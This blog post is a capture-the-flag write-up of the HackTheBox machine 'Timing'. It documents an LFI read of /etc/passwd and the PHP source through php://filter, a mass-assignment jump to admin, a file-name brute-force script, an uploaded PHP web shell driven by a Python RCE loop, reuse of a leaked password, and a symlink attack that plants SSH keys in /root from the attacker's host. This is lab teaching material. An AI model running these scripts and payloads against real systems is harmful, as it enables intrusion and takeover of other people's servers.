---
layout: post
title:  "HackTheBox: Timing"
date:   2022-01-06 10:25:15 +0530
category: Hackthebox Writeups
logo: writeups/assets/images/hackthebox_timing/logo.png
feature_image: ../../../assets/images/hackthebox_timing/HTB_feature_image.png
tags: hackthebox uniqid netutils
---
Timing is a medium box from hackthebox which starts with finding a lfi vulnerability. The lfi vulnerability helps to get the code of `upload.php` page which has a filter to restrict malicious file upload. I bypassed the filter to achieve a remote code execution. With the help of rce I was able to download a zip file from opt directory which contained website source code. The folder was github repository so analyzing previous commits was a success. I found a valid password for user. Privesc was about exploiting sudo permission to put authorize keys in root folder. Once the new authorized key is there gaining root shell was easy.

| machine name 	| Machine Creator 	| Points 	|  IP address  	|               Hackthebox link              	|
|:------------:	|:---------------:	|:------:	|:------------:	|:------------------------------------------:	|
|    Timing    	|      irogir     	|   30   	| 10.10.11.135 	| [Timing](https://app.hackthebox.com/machines/Timing) 	|

## Nmap

```md
┌──(root💀kali)-[~/HTB/timing/nmap]
└─# cat ports.nmap        
# Nmap 7.92 scan initiated Sat Jan  1 10:57:01 2022 as: nmap -p- -T4 -oN ports.nmap 10.10.11.135
Nmap scan report for timing.htb (10.10.11.135)
Host is up (0.083s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

# Nmap done at Sat Jan  1 10:57:22 2022 -- 1 IP address (1 host up) scanned in 21.26 seconds
```

As usual started with nmap. Nmap found only 2 tcp port 22 and 80.

```md
┌──(root💀kali)-[~/HTB/timing/nmap]
└─# cat timing.nmap 
# Nmap 7.92 scan initiated Sat Jan  1 11:00:38 2022 as: nmap -p 22,80 -sCV -oN timing.nmap 10.10.11.135
Nmap scan report for timing.htb (10.10.11.135)
Host is up (0.083s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d2:5c:40:d7:c9:fe:ff:a8:83:c3:6e:cd:60:11:d2:eb (RSA)
|   256 18:c9:f7:b9:27:36:a1:16:59:23:35:84:34:31:b3:ad (ECDSA)
|_  256 a2:2d:ee:db:4e:bf:f9:3f:8b:d4:cf:b4:12:d8:20:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-title: Simple WebApp
|_Requested resource was ./login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan  1 11:00:49 2022 -- 1 IP address (1 host up) scanned in 10.51 seconds
```

Port 80 has Apache httpd running. Based on OpenSSH and Apache versions the host is likely to be running on ubuntu.

## Website (Port 80)

Before accessing the page let's add `timing.htb` in the host file. It will be useful later.

![web_page_login](../../images/hackthebox_timing/webpage_initial.png)

When I tried to open the webpage it redirected to `/login.php` so looked at site headers.

```bash
┌──(root💀kali)-[~]
└─# curl -I timing.htb
HTTP/1.1 302 Found
Date: Fri, 07 Jan 2022 03:03:11 GMT
Server: Apache/2.4.29 (Ubuntu)
Set-Cookie: PHPSESSID=gqoklcsi2c1cu0tgpb4s2domga; expires=Fri, 07-Jan-2022 04:03:11 GMT; Max-Age=3600; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: ./login.php
Content-Type: text/html; charset=UTF-8
```

The page has PHPSESSID cookie set with no httponly flag. That means this cookie can be exploited through script. Also existence of `login.php` indicates that the website uses php.

### Bruteforcing directories

```bash
┌──(root💀kali)-[~/HTB/timing/nmap]
└─# gobuster dir -u http://10.10.11.135/ -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php -o gobuster.out -t 50 -b 403,404                         1 ⨯
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.11.135/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /opt/SecLists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   403,404
[+] User Agent:              gobuster/3.1.0
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2022/01/01 11:28:21 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 313] [--> http://10.10.11.135/images/]
/css                  (Status: 301) [Size: 310] [--> http://10.10.11.135/css/]   
/js                   (Status: 301) [Size: 309] [--> http://10.10.11.135/js/]    
/login.php            (Status: 200) [Size: 5609]                                 
/index.php            (Status: 302) [Size: 0] [--> ./login.php]                  
/logout.php           (Status: 302) [Size: 0] [--> ./login.php]                  
/image.php            (Status: 200) [Size: 0]                                    
/upload.php           (Status: 302) [Size: 0] [--> ./login.php]                  
/header.php           (Status: 302) [Size: 0] [--> ./login.php]                  
/footer.php           (Status: 200) [Size: 3937]                                 
/.                    (Status: 302) [Size: 0] [--> ./login.php]                  
/profile.php          (Status: 302) [Size: 0] [--> ./login.php]                  
/db_conn.php          (Status: 200) [Size: 0]                                    
                                                                                 
===============================================================
2022/01/01 11:30:47 Finished
===============================================================
```

Some interesting php files can be seen here. Though most of the pages redirects to `login.php` but `image.php` gives status code 200 when opened. Another interesting php page is `db_conn.php` which may have sql database username and password. Also `upload.php` indicates that files can be uploaded to the web server. As `image.php` gives a blank page with `200` status code, it is worth fuzzing with different parameters because it may have any lfi or command execution vulnerability.

### Fuzzing image.php with ffuf

Let's first start with basic lfi payload `/etc/passwd` to check if any parameter exists.

```bash
┌──(root💀kali)-[~/HTB/timing]
└─# ffuf -u 'http://timing.htb/image.php?FUZZ=/etc/passwd' -w /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt -c --fw 1              

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://timing.htb/image.php?FUZZ=/etc/passwd
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response words: 1
________________________________________________

img                     [Status: 200, Size: 25, Words: 3, Lines: 1]
:: Progress: [2588/2588] :: Job [1/1] :: 461 req/sec :: Duration: [0:00:11] :: Errors: 0 ::
```

### Exploiting lfi

As seen above the `img` parameter is vulnerable to lfi. But there is some filter which is blocking to read files.

![lfi](../../images/hackthebox_timing/lfi.png)

So I used `php://filter` wrapper to bypass the filter and it worked.

```bash
┌──(root💀kali)-[~/HTB/timing]
└─# curl -s 'http://timing.htb/image.php?img=php://filter/convert.base64-encode/resource=/etc/passwd' | base64 -d 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
syslog:x:102:106::/home/syslog:/usr/sbin/nologin
messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
lxd:x:105:65534::/var/lib/lxd/:/bin/false
uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:109:1::/var/cache/pollinate:/bin/false
sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
aaron:x:1000:1000:aaron:/home/aaron:/bin/bash
```

Looks like only user in this machine is `aaron`. This will be useful to login with ssh and also it is a potential username for the website. Next I tried for log poisoning to get a shell but couldn't find any logs. So I looked at the other php pages that gobuster found.
To do that I first extracted all the php pages from gobuster output file and stored in a different file to pass that in python script.

```bash
┌──(root💀kali)-[~/HTB/timing/www]
└─# cat gobuster.out | awk -F ' ' '{print $1}' | cut -c 2- | grep php
login.php
index.php
logout.php
image.php
upload.php
header.php
footer.php
profile.php
db_conn.php
```

```python
#!/usr/bin/python3

import requests
import base64

with open('php_pages.lst','r') as p:
    pages = [x.strip() for x in p if x]

for page in pages:
    url = f'http://timing.htb/image.php?img=php://filter/convert.base64-encode/resource={page}'
    encoded_response = requests.get(url)
    decoded = base64.b64decode(encoded_response.text)
    file_name = f'php/{page}'
    with open(file_name,'w') as f:
        f.write(decoded.decode('utf-8'))
```

The script iterates through all php files from list and accesses them using request library and base64 decodes them.

#### db_conn.php

```php
<?php
$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');
```

This file has a password for sql database but the password was a dead end.

### Looking into login.php

With a username in hand I tried to login with various common passwords and the username:username combination worked and logged in with password aaron.

![logged_in](../../images/hackthebox_timing/logged_in.png)

The interesting thing to look here that it says `You are logged in as user 2!` which means there exists a `user 1` who is maybe admin. Also there is another page to update profile. Looking at the source code of page I found it is using a javascript `profile.js`.

![edit_profile_php](../../images/hackthebox_timing/edit_profile_php.png)

So I sent the update request to burp to examine and it returned with handful of information.

![profile_update_burp](../../images/hackthebox_timing/profile_update_burp.png)

The post request goes to `/profile_update.php` which is worth looking because gobuster did not find it. Also the `role` parameter is assigned with a value `0` that means if admin exists then admin's role may be `1`.

#### profile_update.php

profile_update.php is a big page with lots of php code so i will include only the required part.

```php
<?php
...
if ($user !== false) {
    ini_set('display_errors', '1');
    ini_set('display_startup_errors', '1');
    error_reporting(E_ALL);
    $firstName = $_POST['firstName'];
    $lastName = $_POST['lastName'];
    $email = $_POST['email'];
    $company = $_POST['company'];
    $role = $user['role'];
    if (isset($_POST['role'])) {
        $role = $_POST['role'];
        $_SESSION['role'] = $role;
    }
...
?>
```

The last three line of this chunk of code is most important because it says that if `role` is specified in the post parameter during updating profile it will set that role for that particular user. So I added a role parameter with value `1` and changed all other to `admin` just to be safe in profile update request in burp and successfully logged in with admin.

![access_admin](../../images/hackthebox_timing/access_admin.png)

### Admin panel

The admin panel has provisions to upload files but with a little playing around with different files I found that it only supports `jpg`. The post request is sent to `upload.php`.

![upload_page](../../images/hackthebox_timing/upload_page.png)

#### upload.php

```php
<?php
include("admin_auth_check.php");

$upload_dir = "images/uploads/";

if (!file_exists($upload_dir)) {
    mkdir($upload_dir, 0777, true);
}

$file_hash = uniqid();

$file_name = md5('$file_hash' . time()) . '_' . basename($_FILES["fileToUpload"]["name"]);
$target_file = $upload_dir . $file_name;
$error = "";
$imageFileType = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));

if (isset($_POST["submit"])) {
    $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
    if ($check === false) {
        $error = "Invalid file";
    }
}

// Check if file already exists
if (file_exists($target_file)) {
    $error = "Sorry, file already exists.";
}

if ($imageFileType != "jpg") {
    $error = "This extension is not allowed.";
}

if (empty($error)) {
    if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
        echo "The file has been uploaded.";
    } else {
        echo "Error: There was an error uploading your file.";
    }
} else {
    echo "Error: " . $error;
}
?>
```

At first the code is checking if the user is admin. If the user is admin then it sets the upload directory which is `images/uploads/`.  If the directory does not exist it makes the directory.Then checks the extension of the file. If it is `jpg` then continues else blocks the upload. Then creates a variable `file_hash` using [`uniqid`](https://www.w3schools.com/php/func_misc_uniqid.asp)(from w3schools) function which generates a unique ID based on the microtime (the current time in microseconds). And then it concatenates with `time` function and base name of the file. And that it is converted to `md5 hash`. That means each and every time a new file will be uploaded it will be stored with a uniq 32 character long name which makes it very hard to find.

### Bruteforcing file names

To find the name at which the uploaded file is stored  in `images/uploads` I wrote a python script. I used the same php code to generate names using subprocess library and bruteforce those names in `uploads`.

```python
#!/usr/bin/python3

import subprocess
import requests

def fuzz(file_name):
    url = 'http://timing.htb/images/uploads/' + file_name
    res = requests.get(url)
    if res.status_code != 404:
        print(f'[+] Found the file at {url}')
        return True
def main():
    while True:
    command = "/usr/bin/php -r \"\$file_hash=uniqid(); \$file_name=md5('\$file_hash' . time()) . '_' . basename('test.jpg'); echo \$file_name;\""
    string = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE)
    binary_name = string.stdout.read()
    file_name = binary_name.decode('utf-8')
    if fuzz(file_name):
        break

if __name__=='__main__':
    try:
        main()
    except KeyboardInterrupt:
        pass
```

![file name bruteforce](../../images/hackthebox_timing/file_brute.png)

I left the script running and uploaded the file and this code successfully found the file uploaded in seconds. Next is to get a rce. I couldn't able to get reverse shell nevertheless a rce was sufficient to get user. To get the rce i added a php one line code during uploading the file and accessed it through the lfi.

```php
<?php system($_GET['c']); ?>
```

![shell_upload](../../images/hackthebox_timing/upload_command.png)

### Getting the rce

To automate the rce I edited the python code to perform command execution. But first let's test it in burp.

![rce_burp](../../images/hackthebox_timing/rce_burp.png)

#### rce using python

```python
#!/usr/bin/python3

import subprocess
import requests

def fuzz(file_name):
    url = 'http://timing.htb/images/uploads/' + file_name
    r = requests.get(url)
    if r.status_code != 404:
    print(f'[+] Found the file at {url}')
    return True
def rce(file_name):
    prompt = '> '
    while True:
        command = input(prompt) #keeps alive the terminal
        url = f'http://timing.htb/image.php?img=images/uploads/{file_name}&c={command}'
        r = requests.get(url)
        print(r.text)

def main():
    while True:
        command = "/usr/bin/php -r \"\$file_hash=uniqid(); \$file_name=md5('\$file_hash' . time()) . '_' . basename('test.jpg'); echo \$file_name;\""
        string = subprocess.Popen(command, shell = True, stdout = subprocess.PIPE)
        binary_name = string.stdout.read()
        file_name = binary_name.decode('utf-8')
        if fuzz(file_name):
            break
    rce(file_name)

if __name__=='__main__':
    try:
        main()
    except KeyboardInterrupt:
        pass
```

![rce_python](../../images/hackthebox_timing/rce_python.png)

## User shell as aaron

Looking at other files in the file system found `source-files-backup.zip` in opt directory. So I copied it to uploads directory and downloaded the backup. After unzipping it I noticed it was a git repository. I looked at the previous commits and found that `db_conn.php` was recently updated.

```bash
┌──(root💀kali)-[~/HTB/timing/backup]
└─# git log                                          
commit 16de2698b5b122c93461298eab730d00273bd83e (HEAD -> master)
Author: grumpy <grumpy@localhost.com>
Date:   Tue Jul 20 22:34:13 2021 +0000

    db_conn updated

commit e4e214696159a25c69812571c8214d2bf8736a3f
Author: grumpy <grumpy@localhost.com>
Date:   Tue Jul 20 22:33:54 2021 +0000

    init
```

Then tried to find what was changed in `db_conn.php`

```bash
┌──(root💀kali)-[~/HTB/timing/backup]
└─# git show 16de2698b5b122c93461298eab730d00273bd83e
commit 16de2698b5b122c93461298eab730d00273bd83e (HEAD -> master)
Author: grumpy <grumpy@localhost.com>
Date:   Tue Jul 20 22:34:13 2021 +0000

    db_conn updated

diff --git a/db_conn.php b/db_conn.php
index f1c9217..5397ffa 100644
--- a/db_conn.php
+++ b/db_conn.php
@@ -1,2 +1,2 @@
 <?php
-$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', REDACTED);
+$pdo = new PDO('mysql:host=localhost;dbname=app', 'root', '4_V3Ry_l0000n9_p422w0rd');
```

Tried to get a ssh connection with new found password and logged in with user `aaron`

## Privilege Escalation

For privilege escalation to root I at first looked at sudo permissions.

```bash
aaron@timing:~$ sudo -l
Matching Defaults entries for aaron on timing:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User aaron may run the following commands on timing:
    (ALL) NOPASSWD: /usr/bin/netutils
```

Aaron has permission to run `/usr/bin/netutils` as root. What I noticed at first that `secure_path` is set so privesc by manipulating the `PATH` variable is not possible. Next I tried to read the file.

```bash
aaron@timing:~$ cat /usr/bin/netutils
#!/bin/bash
java -jar /root/netutils.jar
```

It is just running a jar file called `netutils.jar`. After running the script I found that it tries to download file from url supplied. So I started a python server at my local machine and created a test file. The script downloaded the file and saved it in user's home directory and changed the owner to root.

```bash
aaron@timing:~$ sudo /usr/bin/netutils
netutils v0.1
Select one option:
[0] FTP
[1] HTTP
[2] Quit
Input >> 1
Enter Url: http://10.10.14.9/test.txt
Initializing download: http://10.10.14.9/test.txt
File size: 6 bytes
Opening output file test.txt.0
Server unsupported, starting from scratch with one connection.
Starting download


Downloaded 6 byte in 0 seconds. (0.03 KB/s)
```

![netutils_file](../../images/hackthebox_timing/netuits_file.png)

As the file is saved with root permission, if any file in user directory with a symlink to a file in root exists, netutils will override file with same name after downloading it but will keep the symlink. So I created a file called `authorized keys` in aaron's home directory. Then created a symlink to `/root/.ssh/authorized_keys`. Then I generated a ssh private key in my machine and supplied the public key as authorized key.

```bash
aaron@timing:~$ ln -s /root/.ssh/authorized_keys
aaron@timing:~$ ls -la
total 44
drwxr-x--x 5 aaron aaron 4096 Jan  8 14:58 .
drwxr-xr-x 3 root  root  4096 Dec  2 09:55 ..
lrwxrwxrwx 1 aaron aaron   26 Jan  8 14:58 authorized_keys -> /root/.ssh/authorized_keys
lrwxrwxrwx 1 root  root     9 Oct  5 15:33 .bash_history -> /dev/null
-rw-r--r-- 1 aaron aaron  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 aaron aaron 3771 Apr  4  2018 .bashrc
...[snip]...
```

Next I started a python server and let netutils to download the public key. It replaced the `authorized_keys` is `/root/.ssh` with supplied key and I logged in as root with private key.

![root](../../images/hackthebox_timing/root.png)
